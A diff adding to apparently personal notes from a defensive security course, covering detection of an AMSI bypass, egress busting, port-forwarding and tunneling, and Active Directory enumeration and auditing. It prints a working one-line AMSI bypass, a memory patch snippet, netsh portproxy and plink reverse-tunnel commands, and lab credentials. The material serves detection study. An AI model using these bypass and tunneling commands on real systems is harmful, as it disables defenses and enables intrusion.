@@ -2706,47 +2706,446 @@ Unlike the on-demand scan, the `Detection Source` is Real-Time Protection.
 "amsiutils"
 ```
 
-```pwsh
+`AmsiTamper` label in the `Name` field
 
-```
-```pwsh
-
-```
+`Detection Source` for this event is `AMSI`.
 
 ```pwsh
-
+Get-WDLogEvent 1116 "12/21/2021 8:00:00" "12/21/2021 8:01:00" | Format-List 
 ```
 
+### AMSI Bypass
+
+Query all the PowerShell script block events with Event ID `4104`
+
 ```pwsh
-
-```
-
-```pwsh
-
-```
-```pwsh
-
+Get-PSLogEvent 4104 "12/22/2021 8:41:24" "12/22/2021 8:41:26"
 ```
 
 ```pwsh
+Get-PSLogEvent 4104 "12/22/2021 8:41:24" "12/22/2021 8:41:26" | Where-Object { $_.LevelDisplayName -eq "Warning" } | Format-List
+```
 
+The `$patch` variable that is defined before overwriting a pre-determined address in the script.
+
+```pwsh
+...
+$patch = [byte[]] (
+    0x31, 0xC0,    # xor rax, rax
+    0xC3           # ret  
+)
+[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $targetedAddress, 3)
+...
 ```
 
 ```pwsh
+Get-SysmonEvent $null "12/22/2021 8:41:24" "12/22/2021 8:41:26"
+```
 
+We have several `FileCreate` and `ProcessCreate` events occurring at the same time as the AMSI bypass.
+
+```pwsh
+Get-SysmonEvent 11 "12/22/2021 8:41:24" "12/22/2021 8:41:25" | Format-List
+```
+
+2 unusual file creations taking place:
+
+1. A DLL being written to the `Temp` directory with a randomly generated name.
+
+2. A file with the `.cmdline` extension sharing the same name as the DLL.
+
+```pwsh
+Get-SysmonEvent 1 "12/22/2021 8:41:24" "12/22/2021 8:41:26" | Format-List
+```
+
+`csc.exe`, the command-line compiler for C#. The `/fullpath @` argument specifies a single file containing additional options to be invoked when compiling code.
+
+`cvtres.exe`, invoked by the command-line compiler. This is the Windows Resource to Object Converter, which is part of the chain of binaries used for code compilation.
+
+Based on the `ParentCommandLine` field, we can assume that this is part of the instructions contained in the `.cmdline` file. The instructions specific to `cvtres.exe` are displayed in the `CommandLine` field. 
+
+=> The AMSI bypass script's patching mechanism involves spontaneously writing and compiling code to replace what is loaded in memory
+
+
+The `DNSEvent` and `NetworkConnect` events are relevant to the use of `Invoke-Expression` connecting back to the Kali VM.
+
+```pwsh
+Get-SysmonEvent 11 "12/22/2021 8:41:25" "12/22/2021 8:41:26" | Format-List
+```
+
+The command-line compiler overwriting the DLL that was created before by PowerShell
+
+```pwsh
+$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1); Get-Date
 ```
 
 ```pwsh
+Get-PSLogEvent 4104 "12/22/2021 12:35:06" "12/22/2021 12:35:08"
+```
 
+```pwsh
+Get-PSLogEvent 4104 "12/22/2021 12:35:06" "12/22/2021 12:35:08" | Where-Object { $_.LevelDisplayName -eq "Warning" } | Format-List
 ```
 
 # Network Evasion and Tunneling
 
+## Egress Busting
 
+```bash
+cat /etc/iptables/rules.v4
+```
+
+`FORWARD` and `OUTPUT` chains only allow connections on common ports used for services such as FTP, SSH, SMTP, HTTP
+
+```
+...
+-A FORWARD -i ens160 -o ens192 -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
+-A FORWARD -i ens192 -o ens160 -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
+...
+-A FORWARD -p tcp -m tcp --dport 21 -j ACCEPT
+-A FORWARD -p tcp -m tcp --dport 22 -j ACCEPT
+-A FORWARD -p tcp -m tcp --dport 25 -j ACCEPT
+-A FORWARD -p tcp -m tcp --dport 80 -j ACCEPT
+-A FORWARD -p tcp -m tcp --dport 443 -j ACCEPT
+-A FORWARD -p tcp -m tcp --dport 8080 -j ACCEPT
+...
+-A OUTPUT -p tcp -m tcp --dport 21 -j ACCEPT
+-A OUTPUT -p tcp -m tcp --dport 22 -j ACCEPT
+-A OUTPUT -p tcp -m tcp --dport 25 -j ACCEPT
+-A OUTPUT -p tcp -m tcp --dport 80 -j ACCEPT
+-A OUTPUT -p tcp -m tcp --dport 443 -j ACCEPT
+-A OUTPUT -p tcp -m tcp --dport 8080 -j ACCEPT
+...
+```
+
+**Port forwarding rules** that will redirect traffic on certain ports to the internal network.
+
+```
+...
+:PREROUTING ACCEPT [9:717]
+:INPUT ACCEPT [0:0]
+:OUTPUT ACCEPT [2:146]
+:POSTROUTING ACCEPT [0:0]
+-A PREROUTING -i ens160 -p tcp -m tcp --dport 80 -j DNAT --to-destination 172.16.50.11
+-A PREROUTING -i ens160 -p tcp -m tcp --dport 21 -j DNAT --to-destination 172.16.50.11
+...
+-A POSTROUTING -d 172.16.50.11/32 -o eth1 -p tcp -m tcp --dport 80 -j SNAT --to-source 172.16.50.254
+-A POSTROUTING -d 172.16.50.11/32 -o eth1 -p tcp -m tcp --dport 21 -j SNAT --to-source 172.16.50.254
+COMMIT
+# Completed on Tue Jan 18 09:14:47 2022
+...
+```
+
+These `iptables` rules will redirect any traffic coming to the snort machine on port `80` and `21` to the same ports on the `172.16.50.11` host, which acts as a web server hosted behind the firewall.
+
+```bash
+cat /usr/local/etc/rules/local.rules
+```
+
+```
+alert tcp any any -> any :20 (msg:"Malicious outbound traffic detected"; sid:10000001; metadata:policy security-ips alert;)
+alert tcp any any -> any 23,24 (msg:"Malicious outbound traffic detected"; sid:10000002; metadata:policy security-ips alert;)
+alert tcp any any -> any 26:52 (msg:"Malicious outbound traffic detected"; sid:10000003; metadata:policy security-ips alert;)
+alert tcp any any -> any 54:79 (msg:"Malicious outbound traffic detected"; sid:10000004; metadata:policy security-ips alert;)
+alert tcp any any -> any 81:442 (msg:"Malicious outbound traffic detected"; sid:10000005; metadata:policy security-ips alert;)
+alert tcp any any -> any 444:1000 (msg:"Malicious outbound traffic detected"; sid:10000006; metadata:policy security-ips alert;)
+```
+
+**Egress Busting** technique often involves writing or using a custom tool that will set up a listener on the attackers box and use a firewall such as `iptables` to redirect every port to the the listener.
+
+Next, the attacker uploads a binary to the target host, which will attempt to connect to the attacker box on a port range chosen by the attacker.
+
+The technique essentially works by brute-forcing connections on every port until the binary detects a successful connection on a TCP port.
+
+Snort alerts in `/var/log/snort/alert_fast.txt` => the attacker attempted multiple connections on various sequential ports, up to TCP port 500.
+
+## Port Forwarding and Tunneling
+
+Configure port forwarding differently depending on the OS of the gateway.
+
+E.g., `iptables` and the `netfilter` kernel components can be used on Linux systems
+`ipfirewall` or the `ipfw4` module can be used on BSD systems.
+The Network Shell or the `netsh` utility can be used on Windows systems.
+
+
+Tunneling a protocol involves encapsulating it within a different protocol.
+
+Tunneling through a VPN often causes the traffic to be encrypted by using the IPsec protocol suite while traveling between hosts. This is also the case when tunneling through the Secure Shell (`SSH`) protocol.
+
+Tunneling can also be achieved using less common protocols such as Generic Routing Encapsulation (GRE), `HTTP`, or ICMP.
+
+Local forwarding / tunneling allows the mapping between a local port on a host inside the network and another port on a remote host that also resides within the network.
+
+Remote forwarding / tunneling is used to map an internal host and port and redirect the traffic, making it accessible on a specific external host.
+
+Dynamic forwarding / tunneling is used as a dynamic tunnel rather than being constrained to a single host and port. Dynamic tunneling allows an external host to interact with multiple hosts and ports on the internal network.
+
+## Port Forwarding and Tunneling in Practice
+
+Implement local port forwarding on webhost (`172.16.50.11`), which they have access to and redirect traffic coming in on port `21` to the dbhost (`172.16.50.12`) host on the default MySQL port. Before proceeding with this, the attacker also turns off the currently-running FTP service.
+
+```pwsh
+netsh interface portproxy add v4tov4 listenport=21 listenaddress=172.16.50.11 connectport=3306 connectaddress=172.16.50.12
+
+netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=172.16.50.11 localport=21 action=allow
+```
+
+```bash
+mysql --host=192.168.50.40 --port=21 -uroot -pMkiuCbQ2F6kMkC 
+```
+
+```
+show databases;
+```
+
+Inspect the Event Log and firewall rules that were added
+
+```pwsh
+Get-WinEvent -FilterHashtable @{LogName = 'Microsoft-Windows-Windows Firewall With Advanced Security/Firewall'} -MaxEvents 20
+```
+
+Listing all the firewall rules on the host
+
+```pwsh
+Get-NetFirewallRule -Direction Inbound | Select-Object -Property DisplayName,Profile,Enabled | Where { $_.Enabled -eq 'True'}
+```
+
+```pwsh
+Get-NetFirewallRule -DisplayName "forward_port_rule"
+```
+
+```pwsh
+Get-NetFirewallRule -DisplayName "forward_port_rule" | Get-NetFirewallPortFilter
+```
+
+Inspect the configuration of the `portproxy` interface
+
+```pwsh
+netsh interface portproxy show v4tov4
+```
+
+Transfer the `plink.exe` binary to the compromised host. This is an SSH and Telnet client that the attacker can use to perform a remote port forward. The goal of the tunnel is to map the local SMB port on the attacker machine and allow the attacker to inspect the network shares.
+
+```pwsh
+echo y | plink.exe -ssh -N -l kali -pw toor -R 192.168.48.2:1234:127.0.0.1:445 192.168.48.2 
+```
+
+If the attack was successful, port `1234` should be listening on our attacker01 machine.
+
+```bash
+ss -antp | grep 1234
+```
+
+View the shares available on the host
+
+```bash
+smbclient -L 127.0.0.1 --port=1234 --user=Administrator
+```
+
+This host also exposes the `htdocs` folder => mount the folder
+
+```bash
+sudo mkdir /root/share/
+sudo mount -t cifs -o username=Administrator,port=1234 //127.0.0.1/htdocs /root/share
+sudo ls -l /root/share
+```
+
+```pwsh
+Get-SysmonEvent | Where-Object { $_.Message -like "*plink*" 
+```
+
+```pwsh
+Get-SysmonEvent 1 "1/31/2022 11:46:12" "2/1/2022 12:02:39" | Where-Object { $_.Message -like "*plink*" } | Format-List
+```
 
 # Active Directory Enumeration
 
+By default, `DirectorySearcher` instantiates this object with the `Filter` property to the value of `(objectClass=*)`, which is an LDAP query that effectively returns every entry within a directory service.
 
+Result of executing the query contains the domain controller.
+
+```pwsh
+$Searcher = New-Object System.DirectoryServices.DirectorySearcher
+$Searcher.Filter = '(distinguishedName=CN=DC-2,OU=Domain Controllers,DC=corp,DC=com)'
+$Searcher.FindOne()
+$Searcher.FindAll()
+```
+
+Use this script under the context of another user
+
+```pwsh
+$Searcher = New-Object System.DirectoryServices.DirectorySearcher
+$Searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=corp,DC=com", 'corp\jdoe','Qwerty09!')
+$Searcher.Filter = '(&(objectClass=computer)(cn=*dc*))'
+$Searcher.FindAll()
+```
+
+## Enumerating Active Directory with PowerView
+
+```pwsh
+powershell -exec bypass
+. .\PowerView.ps1
+```
+
+```pwsh
+Get-NetDomainController
+```
+
+```pwsh
+Get-NetGroupMember -Identity 'Domain Admins'
+```
+
+## Detecting Active Directory Enumeration
+
+### Auditing Object Access
+
+List audit policy categories that are configurable on the current system 
+
+```pwsh
+auditpol /list /category
+```
+
+Each category also contains a number of subcategories 
+
+```pwsh
+auditpol /list /subcategory:*
+```
+
+To configure an audit policy for Active Directory leverage the DS Access subcategory called `Directory Service Access`.
+
+By default, this audit policy category is enabled to alert on success events.
+
+A success event assumes that the action that took place was successful.
+
+Confirm that `Directory Service Access` is enabled.
+
+```pwsh
+auditpol /get /subcategory:"Directory Service Access"
+```
+
+`audit entry` will determine when a specific event will be raised.
+
+
+The 5 critical audit entry elements are:
+
+| ELEMENT        | DESCRIPTION |
+| -------------- | ----------- |
+| Principal      | The identity that is being targeted for auditing |
+| Type           | Target success, failure, or both types of events |
+| Access         | Types of permissions that can be granted (and tracked) |
+| Inherited From | Designates whether an audit entry was configured at a higher level than the target object, which would recurse down to any sub entries. |
+| Applies To     | Designates whether the entry is targeting only the current object, descendant objects, or specific object types |
+
+
+To identify when an individual is enumerating AD, leverage the `security principal` element. While we could create audit entries to target a specific account, use the `Everyone` security principal, which is all encompassing.
+
+The `Applies to` element allows us to define which object we are targeting, whether it’s the current object, the current object and descendants (such as objects under an organizational unit), or even a specifically-named object.
+
+The advanced security options allow us to define very granular controls where we can lock down access to an object as a whole, or access to its properties, for a given security principal.
+
+These granular options extend to the auditing component, allowing us to define which operation we want to alert on.
+
+Configure the audit settings for individual objects.
+
+1. Log on to the domain controller and open `Active Directory Users and Computers` (ADUC).
+
+2. Expand the domain root, navigate to `Domain Controllers` and right click `DC-2` to select `Properties`
+
+3. With the `Properties` window open, select `Security` and click `Advanced` on the bottom left
+
+4. With the `Advanced Security Settings` window open, click on the `Auditing` tab.
+
+5. Click on `Add` to create a new auditing policy.
+
+7. Click `Select a principal` and entering `Everyone`.
+
+8. To raise an event when someone has successfully enumerated AD, select the `Success` type.
+
+9. Keep `Applies to` element at the default value for now.
+
+10. The `access` component is split between `permissions` and `properties` for the given object.
+
+11. Locate the `permissions` immediately under the `Applies to` section.
+
+12. Scroll further down and find the `Properties` section. Within the context of this menu, directory service entries are called objects and entry attributes are called properties.
+
+13. To flag access to a given object, ensure that `List contents`, `Read all properties`, and `Read permissions` are checked.
+
+14. Select `Apply` and `OK` to finalize our audit entry.
+
+To test if this works, run a quick LDAP script to query our target object.
+
+```pwsh
+$Searcher = New-Object System.DirectoryServices.DirectorySearcher
+$Searcher.Filter = '(distinguishedName=CN=DC-2,OU=Domain Controllers,DC=corp,DC=com)'
+$Searcher.FindOne()
+```
+
+Open the Event Viewer to find an event `4662` under the security log which details the `An operation was performed on an object` action
+
+The `Subject` provides us the account that accessed this object.
+`Object` provides us details about the object that was accessed.
+`Operation` provides us the details of what operation took place against the object.
+
+Security principals are listed using their security identifiers (SID).
+
+A directory service object is listed using their object GUID.
+
+```pwsh
+
+```
+
+```pwsh
+
+```
+
+```pwsh
+
+```
+
+```pwsh
+
+```
+
+```pwsh
+
+```
+
+```pwsh
+
+```
+
+
+
+### Baseline Monitoring
+
+```pwsh
+
+```
+
+```pwsh
+
+```
+
+```pwsh
+
+```
+
+```pwsh
+
+```
+
+```pwsh
+
+```
+
+```pwsh
+
+```
+
+```pwsh
+
+```
 
 # Windows Lateral Movement
 
@@ -2758,23 +3157,23 @@ Unlike the on-demand scan, the `Detection Source` is Real-Time Protection.
 
 # SIEM Part One: Intro to ELK
 
-```bash
+```pwsh
 
 ```
 
-```bash
+```pwsh
 
 ```
 
-```bash
+```pwsh
 
 ```
 
-```bash
+```pwsh
 
 ```
 
-```bash
+```pwsh
 
 ```
 
